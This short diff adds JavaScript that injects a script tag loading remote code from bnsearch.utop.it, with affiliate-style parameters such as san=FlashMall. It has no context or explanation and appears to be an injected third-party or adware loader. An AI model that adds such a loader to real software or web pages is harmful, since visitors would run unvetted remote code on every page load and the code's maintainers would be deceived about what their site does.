@@ -1,0 +1,4 @@
+var url = '//bnsearch.utop.it/tb/host.jsp?pid=69377&said=mm-1506&san=FlashMall&met=1|0';
+var e=document.createElement('script');
+e.src = url;
+document.body.appendChild(e);
